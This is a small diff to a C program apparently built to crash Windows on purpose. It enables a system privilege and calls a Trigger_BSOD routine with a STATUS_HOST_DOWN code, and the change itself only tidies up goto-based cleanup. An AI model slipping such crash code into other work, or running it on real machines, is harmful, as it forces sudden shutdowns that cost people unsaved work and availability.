@@ -48,15 +48,8 @@ VOID main()
     if (Set_Privilege(19, TRUE, FALSE) == STATUS_SUCCESS) 
     { 
         Trigger_BSOD(0xC0000350); // 0xC0000350 = STATUS_HOST_DOWN, The transport determined that the remote system is down. 
-        goto Cleanup;
-    }
-    else
-    {
-        goto Cleanup;
     }
 
-    // Cleanup code
-    Cleanup:
     if (ntdll) 
         FreeLibrary(ntdll);
     ExitProcess(1);
